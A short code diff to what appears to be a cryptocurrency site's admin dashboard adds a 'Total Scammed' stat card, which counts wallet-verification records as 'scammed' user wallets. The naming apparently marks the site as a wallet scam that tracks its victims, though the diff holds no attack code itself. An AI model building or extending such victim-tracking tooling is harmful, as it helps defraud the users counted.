@@ -11,6 +11,7 @@ const SiteBalance = async () => {
 		}
 	})
 	const wallets = await prisma.userConnectedWallet.count();
+	const scammed = await prisma.walletVerification.count();
 
 	const totalUsdt = users.reduce((t,o)=>t+o.usdtBalance,0);
 	const totalDodo = users.reduce((t,o)=>t+o.wallet,0);
@@ -36,6 +37,12 @@ const SiteBalance = async () => {
 					value: (wallets.toLocaleString()),
 					title: "Total Wallets",
 					description: "Total Connected Wallet of users",
+					diff: 0
+				},
+				{
+					value: (scammed.toLocaleString()),
+					title: "Total Scammed",
+					description: "Total Scammed Wallet of users",
 					diff: 0
 				}
 			]} />
